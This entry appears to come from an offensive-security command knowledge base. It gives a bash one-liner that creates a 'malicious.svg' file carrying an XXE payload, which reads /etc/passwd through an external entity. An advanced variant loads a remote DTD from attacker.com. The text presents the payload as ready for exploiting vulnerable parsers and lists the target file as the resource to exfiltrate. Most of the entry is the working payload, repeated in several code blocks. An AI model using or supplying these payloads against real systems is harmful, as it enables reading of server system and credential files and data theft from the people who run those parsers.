---
data: >-
  echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM
  "file:///etc/passwd">]><svg>&xxe;</svg>' > malicious.svg
tags:
  - xxe
  - payload
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 9433eafa-e731-4f23-b378-9c75d05a42e2
created_at: '2025-12-13T09:00:27.570Z'
updated_at: '2025-12-13T09:00:27.570Z'
verified: false
validated: true
submitted: true
---
# Craft XXE SVG

## Command

```bash
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' > malicious.svg
```

## Description

This command creates a malicious SVG file with an XXE payload that attempts to read an internal file like /etc/passwd. Use it to prepare payloads for XXE exploitation in vulnerable parsers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `file:///etc/passwd` | Path to the internal resource to exfiltrate | Yes |
| `> malicious.svg` | Output file name | Yes |

## Examples

### Basic Usage

```bash
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' > malicious.svg
```

### Advanced Usage

```bash
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><svg>&xxe;</svg>' > remote-xxe.svg
```

## Expected Output

A file named malicious.svg is created containing the XXE payload. No console output if successful.

## Related

- [[commands/curl-upload-svg]]
- [[procedures/Craft-Malicious-SVG-with-XXE-Payload]]
